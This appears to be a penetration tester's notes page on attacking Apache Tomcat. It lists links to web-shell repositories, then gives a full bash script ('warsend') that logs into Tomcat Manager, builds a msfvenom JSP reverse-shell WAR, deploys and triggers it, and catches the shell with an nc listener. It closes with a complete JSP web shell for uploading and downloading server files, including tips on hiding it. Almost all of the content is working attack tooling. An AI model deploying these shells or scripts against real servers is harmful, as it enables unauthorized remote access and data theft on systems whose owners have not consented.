

https://github.com/jbarcia/Web-Shells/blob/master/laudanum/jsp/cmd.war

https://github.com/p0dalirius/Tomcat-webshell-application

https://github.com/mgeeky/tomcatWarDeployer

https://github.com/gquere/javaWebShell

https://github.com/thewhiteh4t/warsend

https://github.com/ivan-sincek/java-reverse-tcp

```


####
####


#!/bin/bash

R="\033[0;31m"
G="\033[0;32m"
C="\033[0;36m"
Y="\033[1;33m"
W="\033[0m"

LHOST=$1
LPORT=$2
RHOST=$3
RPORT=$4
USER=$5
PASS=$6
FNAME=$7
PAYLOAD="java/jsp_shell_reverse_tcp"
EXT="war"

if [ -z $LHOST ] ||
	[ -z $LPORT ] ||
	[ -z $RHOST ] ||
	[ -z $RPORT ] ||
	[ -z $USER ] ||
	[ -z $PASS ] ||
	[ -z $FNAME ];
then
	echo "
Usage :

* All Values are Required *
* Input Filename Without File Extension *

./warsend.sh LHOST LPORT RHOST RPORT Username Password Filename

Example : ./warsend.sh 10.10.13.37 1337 10.10.10.184 8080 tomcat tomcat revshell
"
	exit
fi

echo -e $G"
 _       _____    ____  _____                __
| |     / /   |  / __ \/ ___/___  ____  ____/ /
| | /| / / /| | / /_/ /\__ \/ _ \/ __ \/ __  /
| |/ |/ / ___ |/ _, _/___/ /  __/ / / / /_/ /
|__/|__/_/  |_/_/ |_|/____/\___/_/ /_/\__,_/
"$W
echo -e $G"[>]$C Created By :$W thewhiteh4t"
echo -e $G"[>]$C Version    :$W 1.0.0\n"

echo -e $G"[+]$C LHOST                  :"$W $LHOST
echo -e $G"[+]$C LPORT                  :"$W $LPORT
echo -e $G"[+]$C RHOST                  :"$W $RHOST
echo -e $G"[+]$C RPORT                  :"$W $RPORT
echo -e $G"[+]$C Username               :"$W $USER
echo -e $G"[+]$C Password               :"$W $PASS
echo -e $G"[+]$C Reverse Shell Filename :"$W $FNAME
echo -e $G"[+]$C Payload                :"$W $PAYLOAD

echo -e $Y"\n[!] Checking Dependencies..."$W

cmd_fail=false
COMMANDS=(msfvenom curl nc)

for cmd in "${COMMANDS[@]}"
do
	if ! command -v $cmd &> /dev/null
	then
		echo -e $R"[-]$C Package Not Found :"$W $cmd
		cmd_fail=true
	fi
done

if [ $cmd_fail = true ];
then
	exit
fi

echo -e $Y"\n[!] Testing Tomcat Manager Text API Access...\n"$W

SCODE=$(curl -u $USER:$PASS -s -o /dev/null -w "%{http_code}" http://$RHOST:$RPORT/manager/text)

if [ $SCODE == 401 ];
then
	echo -e $R"[-]$C Incorrect Username/Password!"$W
	exit
elif [ $SCODE == 200 ];
then
	echo -e $G"[+]$C Login Successful!\n"$W
else
	echo "[-] Status Code :" $SCODE
	exit
fi

echo -e $G"[+]$C Generating WAR Reverse Shell..."$W
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $EXT > $FNAME.$EXT

echo -e $Y"[!] Uploading WAR File..."$W
curl -u $USER:$PASS --upload-file $FNAME.$EXT http://$RHOST:$RPORT/manager/text/deploy?path=/$FNAME

echo -e $Y"\n[!] Triggering Reverse Shell...\n"$W
sleep 5 && curl http://$RHOST:$RPORT/$FNAME/ &> /dev/null &

echo -e $G"[+]$C Starting Listener..."$W
nc -lvp $LPORT

echo -e $Y"\n[!] Cleaning Up..."$W
curl -u $USER:$PASS http://$RHOST:$RPORT/manager/text/undeploy?path=/$FNAME
```
####
####
```
<%@page import="java.nio.file.Files"%>
<%@page import="java.nio.file.Paths"%>
<%@page import="java.io.File"%>
<%@page import="org.apache.tomcat.util.http.fileupload.FileItem"%>
<%@page import="org.apache.tomcat.util.http.fileupload.servlet.ServletRequestContext"%>
<%@page import="org.apache.tomcat.util.http.fileupload.servlet.ServletFileUpload"%>
<%@page import="org.apache.tomcat.util.http.fileupload.disk.DiskFileItemFactory"%>

<%@page import="java.util.Iterator"%>
<%-- Copyright (c) 2021 Ivan Šincek --%>
<%-- v3.0 --%>
<%-- Requires Java SE v8 or greater, JDK v8 or greater, and Java EE v5 or greater. --%>

<%-- modify the script name and request parameter name to random ones to prevent others form accessing and using your web shell --%>
<%-- don't forget to change the script name in the action attribute --%>
<%-- when downloading a file, you should URL encode the file path --%>

<%
    // your parameter/key here
    String parameter = "file";
    String output = "";
    if (request.getMethod() == "POST" && request.getContentType() != null && request.getContentType().startsWith("multipart/form-data")) {
    Iterator files = new ServletFileUpload(new DiskFileItemFactory()).parseRequest(new ServletRequestContext(request)).iterator();
        while (files.hasNext()) {
            FileItem file = (FileItem)files.next();
            if (file.getFieldName().equals(parameter)) {
                try {
                    output = file.getName();
                    int pos = output.lastIndexOf(File.separator);
                    if (pos >= 0) {
                        output = output.substring(pos + 1);
                    }
                    output = System.getProperty("user.dir") + File.separator + output;
                    file.write(new File(output));
                    output = String.format("SUCCESS: File was uploaded to '%s'\n", output);
                } catch (Exception ex) {
                    output = String.format("ERROR: %s\n", ex.getMessage());
                }
            }
            file = null;
        }
        files = null;
    }
    if (request.getMethod() == "GET" && request.getParameter(parameter) != null && request.getParameter(parameter).trim().length() > 0) {
        try {
            output = request.getParameter(parameter).trim();
            response.setHeader("Content-Type", "application/octet-stream");
            response.setHeader("Content-Disposition", String.format("attachment; filename=\"%s\"", Paths.get(output).getFileName()));
            response.getOutputStream().write(Files.readAllBytes(Paths.get(output)));
            response.getOutputStream().flush();
            response.getOutputStream().close();
        } catch (Exception ex) {
            output = String.format("ERROR: %s\n", ex.getMessage());
        }
    }
    // if you do not want to use the whole HTML as below, uncomment this line and delete the whole HTML
    // out.print("<pre>" + output + "</pre>"); output = null; System.gc();
%>

<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>JSP File Upload/Download</title>
        <meta name="author" content="Ivan Šincek">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
    </head>
    <body>
        <form method="post" enctype="multipart/form-data" action="./files.jsp">
            <input name="<% out.print(parameter); %>" type="file" required="required">
            <input type="submit" value="Upload">
        </form>
        <pre><% out.print(output); output = null; System.gc(); %></pre>
    </body>
</html>
